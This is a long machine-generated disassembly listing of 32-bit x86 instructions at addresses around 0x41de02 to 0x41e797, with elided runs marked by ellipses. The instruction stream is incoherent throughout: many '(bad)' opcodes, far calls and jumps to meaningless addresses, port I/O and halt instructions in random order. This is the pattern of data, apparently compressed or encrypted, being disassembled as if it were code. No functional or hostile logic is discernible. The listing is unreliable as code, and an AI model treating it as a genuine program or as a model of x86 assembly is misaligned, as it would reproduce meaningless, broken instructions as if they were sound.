  41de02:	fistp  WORD PTR [esi+0x13dee]
  41de08:	add    eax,0x8000001
  41de0d:	or     al,0x48
  41de0f:	hlt    
  41de10:	xchg   ecx,eax
  41de11:	mov    bl,0xc7
  41de13:	and    BYTE PTR [edi],bh
  41de15:	xor    al,0xd2
  41de17:	mov    eax,0xd52016ea
  41de1c:	push   edi
  41de1d:	and    DWORD PTR [esi-0x1],0x18
  41de21:	inc    esi
  41de22:	mov    ds,edx
  41de24:	inc    ebp
  41de25:	stc    
  41de26:	xchg   edx,eax
  41de27:	xchg   edi,eax
  41de28:	and    BYTE PTR [esi],al
  41de2a:	pop    ds
  41de2b:	xor    ecx,esp
  41de2d:	mov    WORD PTR [ebx-0x65321e58],ds
  41de33:	jmp    0x41de4a
  41de35:	pop    ds
  41de36:	dec    edi
  41de37:	adc    dl,BYTE PTR [ebp+ecx*1+0x1d2be48f]
  41de3e:	jg     0x41ddd6
  41de40:	ins    DWORD PTR es:[edi],dx
  41de41:	or     al,BYTE PTR [ebx+0x418e6872]
  41de47:	jmp    0x99fd74d3
  41de4c:	cwde   
  41de4d:	les    ebx,FWORD PTR [edi-0x942bc55]
  41de53:	add    al,0xa
  41de55:	scas   al,BYTE PTR es:[edi]
  41de56:	cmp    bl,0xc7
  41de59:	jb     0x41de34
  41de5b:	lock fnstcw WORD PTR [edx+esi*8+0x238313df]
  41de63:	dec    edi
  41de64:	idiv   ah
  41de66:	dec    edi
  41de67:	mov    esp,0x660cf091
  41de6c:	test   ah,0x16
  41de6f:	cmp    DWORD PTR [eax],esi
  41de71:	sub    dl,al
  41de73:	add    DWORD PTR [edx],ebx
  41de75:	xchg   esp,eax
  41de76:	fistp  DWORD PTR [esi+0x11]
  41de79:	pop    esi
  41de7a:	sub    esi,ecx
  41de7c:	mul    BYTE PTR [edi]
  41de7e:	shl    DWORD PTR [edx+0x6],cl
  41de81:	mov    edx,0x79a82dfd
  41de86:	adc    BYTE PTR [ebx-0x2039414a],al
  41de8c:	xchg   esp,eax
  41de8d:	retf   
  41de8e:	or     eax,0xde981de6
  41de93:	push   0xf4075e71
  41de98:	mov    ds:0x8cdaad0a,al
  41de9d:	enter  0x73da,0xaa
  41dea1:	pusha  
  41dea2:	pop    ebx
  41dea3:	lods   eax,DWORD PTR ds:[esi]
  41dea4:	test   BYTE PTR [edx-0x6f6ca654],bl
  41deaa:	test   cl,dh
  41deac:	js     0x41dee3
  41deae:	push   0xc07ce67c
  41deb3:	sub    ch,BYTE PTR [ebx-0x6d111e9e]
  41deb9:	outs   dx,DWORD PTR ds:[esi]
  41deba:	loopne 0x41dedf
  41debc:	(bad)  
  41debe:	cmp    edx,DWORD PTR [edx]
  41dec0:	xor    eax,ebp
  41dec2:	cmp    DWORD PTR [ebp+0x5d7c1f45],edx
  41dec8:	jmp    0x4fc3f8fe
  41decd:	sbb    ch,BYTE PTR [edx+ebx*4+0x7e]
  41ded1:	outs   dx,DWORD PTR ds:[esi]
  41ded2:	mov    al,ds:0xd1b1b8fd
  41ded7:	sbb    al,0x89
  41ded9:	(bad)  
  41deda:	sbb    esp,ebx
  41dedc:	stos   BYTE PTR es:[edi],al
  41dedd:	(bad)  
  41dede:	std    
  41dedf:	adc    BYTE PTR [edi+0x48],bh
  41dee2:	mov    bh,0x93
  41dee4:	push   cs
  41dee5:	pop    edi
  41dee6:	adc    al,0x6f
  41dee8:	cdq    
  41dee9:	sub    DWORD PTR [eax],0x1123f78e
  41deef:	cs adc eax,0x40543167
  41def5:	inc    ebp
  41def6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def7:	das    
  41def8:	iret   
  41def9:	jno    0x41df0f
  41defb:	rcr    DWORD PTR ss:[ecx-0x3a],cl
  41deff:	xchg   ecx,eax
  41df00:	cli    
  41df01:	out    dx,eax
  41df02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df03:	bound  edx,QWORD PTR [ecx]
  41df05:	jle    0x41df3c
  41df07:	iret   
  41df08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df09:	inc    eax
  41df0a:	imul   edx,DWORD PTR [edi+0x34],0x417256aa
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xa9e39ce9
  41df82:	outs   dx,BYTE PTR ds:[esi]
  41df83:	in     eax,dx
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0xba000001
  41df8d:	lds    edi,FWORD PTR [eax+ecx*1+0x62c1da7f]
  41df94:	sub    ecx,edx
  41df96:	fucomp st(1)
  41df98:	mov    bh,0x7
  41df9a:	push   eax
  41df9b:	add    ch,BYTE PTR [esi]
  41df9d:	pop    ecx
  41df9e:	push   ecx
  41df9f:	push   edx
  41dfa0:	pop    ecx
  41dfa1:	ins    BYTE PTR es:[edi],dx
  41dfa2:	mov    al,ah
  41dfa4:	pop    esp
  41dfa5:	loop   0x41dfb1
  41dfa7:	xchg   ebx,eax
  41dfa8:	adc    al,0x3b
  41dfaa:	mov    al,ds:0x1f5c4f60
  41dfaf:	fs int 0xe
  41dfb2:	arpl   WORD PTR [edi-0x13],ax
  41dfb5:	out    dx,eax
  41dfb6:	pop    eax
  41dfb7:	cld    
  41dfb8:	adc    al,BYTE PTR [ecx+0x61]
  41dfbb:	std    
  41dfbc:	sbb    eax,0xae0dacb4
  41dfc1:	dec    ebx
  41dfc2:	adc    al,0x79
  41dfc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfc5:	cmp    dl,BYTE PTR [ecx]
  41dfc7:	hlt    
  41dfc8:	call   0x7c58:0xf84fd2f4
  41dfcf:	pop    ebx
  41dfd0:	cmc    
  41dfd1:	call   0x754d:0xc84370b5
  41dfd8:	lods   eax,DWORD PTR ds:[esi]
  41dfd9:	and    esp,ecx
  41dfdb:	sub    BYTE PTR [esi],dl
  41dfdd:	pop    edi
  41dfde:	add    eax,edx
  41dfe0:	ret    
  41dfe1:	ficom  DWORD PTR [ebx+eiz*8]
  41dfe4:	aaa    
  41dfe5:	mov    ds:0x5471bd19,al
  41dfea:	dec    eax
  41dfeb:	jge    0x41e028
  41dfed:	rcl    DWORD PTR [edi+0x76],0x5b
  41dff1:	inc    ecx
  41dff2:	ins    DWORD PTR es:[edi],dx
  41dff3:	push   es
  41dff4:	pop    ebx
  41dff5:	shl    DWORD PTR ds:0xcef639a3,cl
  41dffb:	cs jns 0x41df85
  41dffe:	mov    dh,0x7b
  41e000:	mov    WORD PTR ds:[ebp+0x11],?
  41e004:	loop   0x41e028
  41e006:	mov    ecx,0x6610e64e
  41e00b:	mov    ah,BYTE PTR [edi]
  41e00d:	pop    esp
  41e00e:	xor    BYTE PTR [edi-0x55],0xc7
  41e012:	mov    dl,0xd2
  41e014:	int    0x79
  41e016:	xchg   ebx,eax
  41e017:	das    
  41e018:	dec    ebp
  41e019:	ds push esp
  41e01b:	jl     0x41e04a
  41e01d:	xor    bh,ah
  41e01f:	repnz lods al,BYTE PTR ds:[esi]
  41e021:	adc    al,0x6b
  41e023:	sar    DWORD PTR [edx-0x52],1
  41e026:	into   
  41e027:	stos   BYTE PTR es:[edi],al
  41e028:	xchg   ebp,eax
  41e029:	dec    BYTE PTR [esi+ebx*8+0x7]
  41e02d:	fstp   TBYTE PTR [ecx-0x6cdf9449]
  41e033:	adc    esi,esp
  41e035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e036:	fdivr  DWORD PTR [eax+0x19]
  41e039:	and    eax,0x30187649
  41e03e:	mov    WORD PTR [esi+0x72],cs
  41e041:	fld    QWORD PTR [esi+0x3]
  41e044:	adc    eax,0x88c47fe3
  41e049:	adc    al,0x93
  41e04b:	inc    ebx
  41e04c:	ret    
  41e04d:	fidiv  DWORD PTR [edi+0x1]
  41e050:	jo     0x41e01d
  41e052:	xchg   esi,eax
  41e053:	das    
  41e054:	push   es
  41e055:	pop    esp
  41e056:	(bad)  
  41e057:	mov    ah,0x9c
  41e059:	push   esi
  41e05a:	add    BYTE PTR [ecx],ah
  41e05c:	hlt    
  41e05d:	jl     0x41e003
  41e05f:	cwde   
  41e060:	stos   BYTE PTR es:[edi],al
  41e061:	jg     0x41dfe7
  41e063:	push   0xffffffa8
  41e065:	mov    DWORD PTR [ecx],esi
  41e067:	add    ah,BYTE PTR [ebp-0x22019978]
  41e06d:	pop    esi
  41e06e:	ins    DWORD PTR es:[edi],dx
  41e06f:	xlat   BYTE PTR ds:[ebx]
  41e070:	(bad)  
  41e072:	jne    0x41e0c4
  41e074:	xchg   ebp,eax
  41e075:	mov    dh,0x94
  41e077:	lahf   
  41e078:	iret   
  41e079:	lds    edx,FWORD PTR ds:[esi]
  41e07c:	and    ch,BYTE PTR [edi-0x56]
  41e07f:	les    ebx,FWORD PTR [esi-0x50902776]
  41e085:	not    BYTE PTR [edx]
  41e087:	push   cs
  41e088:	and    eax,ebp
  41e08a:	pushf  
  41e08b:	mov    ds:0xc7ee0669,al
  41e090:	mov    ds:0x0,al
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	into   
  41e101:	popf   
  41e102:	retf   
  41e103:	and    edi,eax
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    eax,0xd6000001
  41e10d:	add    eax,0x72ea5145
  41e112:	scas   al,BYTE PTR es:[edi]
  41e113:	push   cs
  41e114:	popf   
  41e115:	adc    edx,DWORD PTR [ecx+0x44482317]
  41e11b:	(bad)  
  41e11c:	and    edx,DWORD PTR [eax+0x69]
  41e11f:	imul   ebp
  41e121:	mov    edi,0x88ecf77a
  41e126:	loopne 0x41e100
  41e128:	xor    eax,0xdbb14202
  41e12d:	jbe    0x41e163
  41e12f:	push   ecx
  41e130:	pop    es
  41e131:	das    
  41e132:	and    BYTE PTR [edx],bh
  41e134:	popa   
  41e135:	or     al,0xbc
  41e137:	imul   eax,DWORD PTR [esi+0x7ec190cf],0x825c62e5
  41e141:	pop    eax
  41e142:	test   DWORD PTR [edi],0xbd4c4b6
  41e148:	mov    ds:0x6f1a3c65,al
  41e14d:	dec    ebp
  41e14e:	repnz mov bl,0x35
  41e151:	scas   al,BYTE PTR es:[edi]
  41e152:	jno    0x41e1a5
  41e154:	iret   
  41e155:	inc    edx
  41e156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e157:	adc    BYTE PTR [ecx-0x3d4e7d4e],ch
  41e15d:	addr16 daa 
  41e15f:	dec    edi
  41e160:	inc    ebx
  41e161:	xor    ch,BYTE PTR [ebp-0x37a67648]
  41e167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e168:	test   DWORD PTR [edi],ebp
  41e16a:	lahf   
  41e16b:	pop    eax
  41e16c:	div    DWORD PTR [esi+edx*1+0x3d]
  41e170:	or     eax,0xefd6cca2
  41e175:	les    edi,FWORD PTR [edi-0x7a]
  41e178:	xchg   ebp,eax
  41e179:	sub    DWORD PTR [ecx+0x20f27260],esp
  41e17f:	mov    ebp,DWORD PTR [ebx-0x39044e41]
  41e185:	xor    DWORD PTR [edx+0x92289d0],0x73
  41e18c:	adc    DWORD PTR [ebx+ebp*2+0x62269518],edx
  41e193:	inc    esi
  41e194:	push   ebp
  41e195:	fwait
  41e196:	lods   eax,DWORD PTR ds:[esi]
  41e197:	hlt    
  41e198:	jns    0x41e14b
  41e19a:	xchg   edi,eax
  41e19b:	sti    
  41e19c:	pop    edx
  41e19d:	dec    ebx
  41e19e:	pop    edi
  41e19f:	adc    eax,DWORD PTR [ecx-0x29]
  41e1a2:	or     BYTE PTR [ebx+0x2a],dh
  41e1a5:	stc    
  41e1a6:	mov    esp,0x3c730dcb
  41e1ab:	lods   eax,DWORD PTR ds:[esi]
  41e1ac:	scas   al,BYTE PTR es:[edi]
  41e1ad:	sti    
  41e1ae:	test   al,0x89
  41e1b0:	in     al,dx
  41e1b1:	das    
  41e1b2:	mov    ch,0xd5
  41e1b4:	sub    DWORD PTR [eax-0x52],esi
  41e1b7:	aad    0xd7
  41e1b9:	stos   BYTE PTR es:[edi],al
  41e1ba:	aam    0x9e
  41e1bc:	in     eax,dx
  41e1bd:	retf   
  41e1be:	dec    ecx
  41e1bf:	int3   
  41e1c0:	adc    esp,0x39
  41e1c3:	fcmovbe st,st(7)
  41e1c5:	pushf  
  41e1c6:	xchg   esi,eax
  41e1c7:	icebp  
  41e1c8:	adc    BYTE PTR [ecx-0x3f],cl
  41e1cb:	cld    
  41e1cc:	lods   eax,DWORD PTR ds:[esi]
  41e1cd:	in     al,0xc5
  41e1cf:	pop    ebx
  41e1d0:	mov    WORD PTR [ebx-0x21],?
  41e1d3:	xor    WORD PTR [eax+0x36],di
  41e1d7:	fsub   QWORD PTR [edi-0x5d]
  41e1da:	icebp  
  41e1db:	std    
  41e1dc:	pusha  
  41e1dd:	sahf   
  41e1de:	iret   
  41e1df:	add    DWORD PTR [esi],ebx
  41e1e1:	les    esp,FWORD PTR [ecx+0x5c]
  41e1e4:	mov    BYTE PTR [edx+0x6d],bl
  41e1e7:	les    eax,FWORD PTR [ebx]
  41e1e9:	jecxz  0x41e242
  41e1eb:	ss pop ebp
  41e1ed:	lahf   
  41e1ee:	inc    esp
  41e1ef:	or     bh,BYTE PTR [eax+0x2]
  41e1f2:	sub    DWORD PTR [edx],esp
  41e1f4:	js     0x41e206
  41e1f6:	xor    al,0x2b
  41e1f8:	test   BYTE PTR [eax+0x434ffbf4],ah
  41e1fe:	dec    dl
  41e200:	cld    
  41e201:	push   ss
  41e202:	sbb    DWORD PTR [edi-0x5e],ebp
  41e205:	std    
  41e206:	sti    
  41e207:	lea    ecx,[edx-0x16]
  41e20a:	push   0x62
  41e20c:	adc    ebp,ebp
  41e20e:	sub    bl,BYTE PTR [ebx+0x1]
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xe
  41e281:	mul    BYTE PTR [ebx]
  41e283:	adc    ebp,edi
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0xb6000001
  41e28d:	retf   
  41e28e:	dec    ebx
  41e28f:	xchg   esi,eax
  41e290:	jle    0x41e2c0
  41e292:	or     DWORD PTR ds:0xa46c5306,0x605f3bfc
  41e29c:	loop   0x41e259
  41e29e:	mov    dh,bh
  41e2a0:	mov    bl,0x1a
  41e2a2:	repnz pop ss
  41e2a4:	sti    
  41e2a5:	test   eax,0xc58d20e8
  41e2aa:	pop    ecx
  41e2ab:	push   edx
  41e2ac:	push   eax
  41e2ad:	(bad)  
  41e2af:	mov    edx,0xb5b2dc43
  41e2b4:	push   ebx
  41e2b5:	xor    eax,0xf846386a
  41e2ba:	jnp    0x41e263
  41e2bc:	int    0x35
  41e2be:	xchg   ebx,eax
  41e2bf:	fist   DWORD PTR [ecx-0x30267c3a]
  41e2c5:	jmp    0x6a215ef7
  41e2ca:	xchg   ebp,eax
  41e2cb:	retf   
  41e2cc:	inc    ecx
  41e2cd:	sub    al,0xa
  41e2cf:	mov    cl,0x53
  41e2d1:	inc    ebx
  41e2d2:	scas   al,BYTE PTR es:[edi]
  41e2d3:	xchg   ebp,esi
  41e2d5:	arpl   WORD PTR [ebx+0x4df5e09],dx
  41e2db:	or     BYTE PTR [edi+0x2a30f01a],ah
  41e2e1:	jno    0x41e32a
  41e2e3:	icebp  
  41e2e4:	sti    
  41e2e5:	push   esi
  41e2e6:	xor    DWORD PTR [edx-0x7c],esp
  41e2e9:	mov    DWORD PTR [ebp+0x79],ebx
  41e2ec:	call   0xbdc5:0x390c1a2
  41e2f3:	pop    esi
  41e2f4:	cmp    eax,0xe93abfb0
  41e2f9:	sbb    al,0xc0
  41e2fb:	sbb    eax,0x59692fde
  41e300:	add    al,0x76
  41e302:	fs call 0x1b20:0x29bf7009
  41e30a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e30b:	popf   
  41e30c:	lahf   
  41e30d:	mov    ebx,0x3dfd417e
  41e312:	out    dx,eax
  41e313:	xchg   ebp,eax
  41e314:	arpl   WORD PTR [esi],ax
  41e316:	cmp    ah,BYTE PTR [edx-0x3de14254]
  41e31c:	(bad)  
  41e31d:	fcmovnb st,st(7)
  41e31f:	xor    eax,0xbfe5dfce
  41e324:	push   0xffffff95
  41e326:	in     al,0x6c
  41e328:	daa    
  41e329:	shl    BYTE PTR [esi-0x48e752aa],1
  41e32f:	retf   0x8ec5
  41e332:	sub    al,0xdb
  41e334:	loope  0x41e39e
  41e336:	cmp    eax,0xd5b93228
  41e33b:	scas   al,BYTE PTR es:[edi]
  41e33c:	fwait
  41e33d:	and    DWORD PTR [esi],0x81b65fd4
  41e343:	mov    edi,0x8c5cd66c
  41e348:	jmp    0x41e2de
  41e34a:	xor    al,BYTE PTR [esi]
  41e34c:	sub    eax,0x6a3d96d9
  41e351:	sahf   
  41e352:	xchg   esp,eax
  41e353:	adc    eax,0x10ec79eb
  41e358:	aaa    
  41e359:	gs stc 
  41e35b:	rcl    DWORD PTR [edx+0x49f9faaf],1
  41e361:	adc    dh,BYTE PTR [ecx-0x48414e5b]
  41e367:	and    BYTE PTR [ecx],0x26
  41e36a:	out    dx,eax
  41e36b:	sbb    BYTE PTR [edi-0x490a1161],dl
  41e371:	call   0x7e4060b2
  41e376:	xchg   DWORD PTR [edi],edx
  41e378:	cmp    esp,DWORD PTR [ecx+0x41cb57bb]
  41e37e:	sub    DWORD PTR gs:[ecx-0xd],ebp
  41e382:	shl    DWORD PTR [ecx-0x7cf2a782],0x89
  41e389:	pop    esi
  41e38a:	xor    DWORD PTR [ecx-0x2b497393],ebp
  41e390:	fld    QWORD PTR [eax]
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x96541b09
  41e403:	adc    eax,0x14202
  41e408:	add    eax,0xae000001
  41e40d:	sub    ch,BYTE PTR [ecx]
  41e40f:	push   ss
  41e410:	inc    ebp
  41e411:	stc    
  41e412:	cmp    eax,0x1da7fc45
  41e417:	addr16 jne 0x41e46d
  41e41a:	inc    ebp
  41e41b:	mov    esp,0xb50d3d3f
  41e420:	dec    eax
  41e421:	ja     0x41e406
  41e423:	cmp    ecx,DWORD PTR [ebp+0x11135fb0]
  41e429:	inc    edi
  41e42a:	xchg   ecx,eax
  41e42b:	xor    al,0x84
  41e42d:	(bad)  
  41e42e:	call   0x9267:0x64655aa2
  41e435:	out    dx,al
  41e436:	mov    ch,BYTE PTR [eax]
  41e438:	jecxz  0x41e3f7
  41e43a:	fs jb  0x41e417
  41e43d:	dec    edi
  41e43e:	and    ah,dl
  41e440:	dec    edx
  41e441:	test   al,0xaf
  41e443:	pop    es
  41e444:	jo     0x41e49d
  41e446:	fistp  WORD PTR [eax+edi*4-0x3deb3645]
  41e44d:	aas    
  41e44e:	leave  
  41e44f:	test   ecx,ebx
  41e451:	cld    
  41e452:	xor    eax,0xa8bfe9e3
  41e457:	ins    DWORD PTR es:[edi],dx
  41e458:	mov    edi,0xea83555d
  41e45d:	out    dx,eax
  41e45e:	dec    ebx
  41e45f:	loop   0x41e4d3
  41e461:	in     al,0xf5
  41e463:	fwait
  41e464:	xchg   edi,eax
  41e465:	inc    esp
  41e466:	mov    al,ds:0x8efdfe08
  41e46b:	leave  
  41e46c:	sar    DWORD PTR [ebx-0x65fccd1f],0xdc
  41e473:	aaa    
  41e474:	sub    al,0x5a
  41e476:	shl    DWORD PTR [ebp+eax*2+0x1b],1
  41e47a:	arpl   WORD PTR [edx],cx
  41e47c:	jo     0x41e42b
  41e47e:	add    edx,DWORD PTR [ecx-0x305f2072]
  41e484:	and    ah,BYTE PTR [ebp+0x446e6953]
  41e48a:	ja     0x41e45d
  41e48c:	or     al,0x34
  41e48e:	jo     0x41e46a
  41e490:	in     eax,dx
  41e491:	int3   
  41e492:	int3   
  41e493:	adc    cl,bl
  41e495:	xor    DWORD PTR [edx+0x19283f67],edx
  41e49b:	call   0x7b798fc3
  41e4a0:	mov    eax,esi
  41e4a2:	stos   BYTE PTR es:[edi],al
  41e4a3:	nop
  41e4a4:	and    DWORD PTR [ebx+ebx*4+0x372c4025],ebp
  41e4ab:	cmp    DWORD PTR [esi+0x14],ebp
  41e4ae:	pushf  
  41e4af:	stos   BYTE PTR es:[edi],al
  41e4b0:	mov    dh,0x3a
  41e4b2:	fimul  DWORD PTR [esi-0x71fb20cd]
  41e4b8:	addr16 adc eax,0xd1cbbd5b
  41e4be:	pop    ebx
  41e4bf:	dec    edx
  41e4c0:	scas   eax,DWORD PTR es:[edi]
  41e4c1:	pop    eax
  41e4c2:	dec    esi
  41e4c3:	jl     0x41e510
  41e4c5:	fst    DWORD PTR [edx+0xccfcadd]
  41e4cb:	sar    BYTE PTR [eax],1
  41e4cd:	fst    QWORD PTR ds:0x28d
  41e4d2:	cmp    eax,0xeb334e1a
  41e4d7:	xor    ah,dl
  41e4d9:	aas    
  41e4da:	stos   DWORD PTR es:[edi],eax
  41e4db:	jb     0x41e516
  41e4dd:	hlt    
  41e4de:	(bad)  
  41e4df:	sti    
  41e4e0:	cmp    al,0xc2
  41e4e2:	push   ebp
  41e4e3:	inc    ebp
  41e4e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4e5:	test   DWORD PTR [eax-0x6e89e473],esi
  41e4eb:	cmc    
  41e4ec:	adc    eax,0xabbe266f
  41e4f1:	xchg   edi,eax
  41e4f2:	fidiv  WORD PTR [ecx-0x2c]
  41e4f5:	and    al,0x3f
  41e4f7:	push   0x5a
  41e4f9:	and    eax,0x2339256
  41e4fe:	pop    edx
  41e4ff:	enter  0x80fc,0x7d
  41e503:	loope  0x41e4b4
  41e505:	mov    DWORD PTR [edi+0x1c],ebp
  41e508:	jae    0x41e53a
  41e50a:	pop    ecx
  41e50b:	mov    esp,0xc606edc2
  41e510:	out    0x0,al
	...
  41e572:	add    BYTE PTR [eax],al
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e57c
  41e581:	mov    dx,0x781
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0xa9000001
  41e58d:	jge    0x41e5d7
  41e58f:	sub    DWORD PTR [eax-0x31],esp
  41e592:	mov    esi,0x9ecf007c
  41e597:	xor    eax,0xd877245d
  41e59c:	stc    
  41e59d:	retf   0x6163
  41e5a0:	cmp    al,0x88
  41e5a2:	sbb    eax,0x6c8b92ec
  41e5a7:	int3   
  41e5a8:	push   es
  41e5a9:	xchg   DWORD PTR [eax],ebx
  41e5ab:	push   ebx
  41e5ac:	(bad)  
  41e5ad:	sbb    cl,bh
  41e5af:	imul   esi,DWORD PTR [ebx+ecx*4-0x67],0xce195140
  41e5b7:	mov    ch,0xf4
  41e5b9:	sbb    eax,0x867ed0bf
  41e5be:	adc    ecx,edi
  41e5c0:	xor    DWORD PTR [edx],esp
  41e5c2:	push   ecx
  41e5c3:	add    eax,0xf6f72777
  41e5c8:	pop    ebx
  41e5c9:	ins    BYTE PTR es:[edi],dx
  41e5ca:	add    al,0x8d
  41e5cc:	dec    ebp
  41e5cd:	stos   BYTE PTR es:[edi],al
  41e5ce:	test   ebp,ebx
  41e5d0:	mov    bl,0x5
  41e5d2:	fistp  DWORD PTR [edx]
  41e5d4:	cmp    DWORD PTR [eax+0x374e2f8b],ecx
  41e5da:	sbb    al,0xdb
  41e5dc:	(bad)  
  41e5dd:	push   eax
  41e5de:	or     BYTE PTR [edx+eiz*1],cl
  41e5e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5e2:	and    eax,0x198f02a5
  41e5e8:	sbb    DWORD PTR [ebx],edx
  41e5ea:	stos   DWORD PTR es:[edi],eax
  41e5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5ec:	pop    ecx
  41e5ed:	cld    
  41e5ee:	call   0x76843d79
  41e5f3:	cmp    DWORD PTR ds:0xc7b155d9,ebx
  41e5f9:	add    DWORD PTR [esi+ecx*1],esi
  41e5fc:	clc    
  41e5fd:	dec    ecx
  41e5fe:	push   0xffffffaa
  41e600:	call   0xbf8:0x4e6b62f0
  41e607:	lock (bad) 
  41e609:	aaa    
  41e60a:	out    0xb9,eax
  41e60c:	dec    edx
  41e60d:	mov    dh,0x5f
  41e60f:	cwde   
  41e610:	(bad)  
  41e611:	mov    ecx,0x674681ac
  41e616:	pop    esp
  41e617:	and    ecx,ecx
  41e619:	mov    ds,WORD PTR [ebx]
  41e61b:	sub    ebx,DWORD PTR [ebp-0x3834c64b]
  41e621:	sbb    DWORD PTR ds:0x2a51a7f0,esp
  41e627:	(bad)  
  41e628:	imul   ebx,DWORD PTR ds:0xe7a8184a,0x7e
  41e62f:	pop    ds
  41e630:	xor    dl,BYTE PTR [eax+0xcf48abb]
  41e636:	(bad)  
  41e638:	or     edx,0x1a268005
  41e63e:	icebp  
  41e63f:	pop    esp
  41e640:	ja     0x41e5f4
  41e642:	mov    DWORD PTR [edi+0xcf657ea],esi
  41e648:	mov    WORD PTR [eax],fs
  41e64a:	loopne 0x41e5fd
  41e64c:	xor    ecx,edx
  41e64e:	push   ecx
  41e64f:	out    dx,al
  41e650:	iret   
  41e651:	loope  0x41e69c
  41e653:	idiv   al
  41e655:	iret   
  41e656:	and    DWORD PTR [edi],edx
  41e658:	or     DWORD PTR [edx-0x16],eax
  41e65b:	cmp    eax,0xcf5ebd7e
  41e660:	mov    cl,0x27
  41e662:	adc    eax,0xa9b2a3d6
  41e667:	sub    ebx,DWORD PTR [ebp-0x229da6ca]
  41e66d:	dec    edi
  41e66e:	test   al,0x2
  41e670:	or     dh,BYTE PTR [esi+0x65]
  41e673:	aam    0xcf
  41e675:	mov    edi,0x961d825b
  41e67a:	test   al,0x5
  41e67c:	inc    esp
  41e67d:	sbb    edi,DWORD PTR [edi+esi*4-0x4f072ce6]
  41e684:	push   ebp
  41e685:	mov    ch,0x4
  41e687:	(bad)  
  41e688:	xchg   ecx,eax
  41e689:	lds    esp,FWORD PTR [esi]
  41e68b:	pop    esi
  41e68c:	aaa    
  41e68d:	push   esi
  41e68e:	sbb    BYTE PTR [esi+0x6a],dh
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    eax,ecx
  41e701:	stos   DWORD PTR es:[edi],eax
  41e702:	adc    al,0xb5
  41e704:	or     al,0x44
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0x1
  41e70d:	add    esp,DWORD PTR [edi+esi*8]
  41e710:	pop    edi
  41e711:	stos   DWORD PTR es:[edi],eax
  41e712:	repz hlt 
  41e714:	inc    eax
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	pop    esi
  41e717:	dec    DWORD PTR [edx]
  41e719:	adc    al,0x91
  41e71b:	jns    0x41e6fa
  41e71d:	pusha  
  41e71e:	xchg   ebp,eax
  41e71f:	(bad)  
  41e720:	fcomp  QWORD PTR [ebp-0x5a]
  41e723:	adc    al,0xca
  41e725:	(bad)  
  41e726:	mov    dh,0x5e
  41e728:	pop    esi
  41e729:	jl     0x41e768
  41e72b:	pop    ebp
  41e72c:	ja     0x41e752
  41e72e:	push   ebp
  41e72f:	push   edi
  41e730:	mov    edx,0x3616ea4f
  41e735:	hlt    
  41e736:	mov    BYTE PTR [esp+ecx*4+0x6b369f66],dl
  41e73d:	mov    dl,0xc0
  41e73f:	cwde   
  41e740:	dec    ebx
  41e741:	lock xchg DWORD PTR [edx+0x51f21f81],ebx
  41e748:	pop    ecx
  41e749:	cs xor al,0x29
  41e74c:	aam    0xb1
  41e74e:	(bad)  
  41e74f:	mov    ebx,0xd0648e3b
  41e754:	aad    0xd6
  41e756:	lods   al,BYTE PTR ds:[esi]
  41e757:	dec    ecx
  41e758:	jae    0x41e78a
  41e75a:	jmp    0x57c0:0x733ab772
  41e761:	mov    ch,0x4e
  41e763:	jo     0x41e786
  41e765:	jl     0x41e7cc
  41e767:	hlt    
  41e768:	push   ds
  41e769:	out    dx,eax
  41e76a:	lock rcr DWORD PTR gs:[ecx+ebx*1+0x6614056d],0xca
  41e774:	push   edi
  41e775:	fs mov cl,0xe9
  41e778:	loopne 0x41e7eb
  41e77a:	push   esp
  41e77b:	fwait
  41e77c:	xor    al,BYTE PTR [eax+0x977f388]
  41e782:	pop    ds
  41e783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e784:	sub    eax,0x62869f69
  41e789:	stos   BYTE PTR es:[edi],al
  41e78a:	es dec eax
  41e78c:	(bad)  
  41e78d:	out    0x4b,al
  41e78f:	int    0x6a
  41e791:	adc    BYTE PTR [edx+0x57],dh
  41e794:	jle    0x41e747
  41e796:	scas   al,BYTE PTR es:[edi]
  41e797:	adc    eax,0xa69f2a8
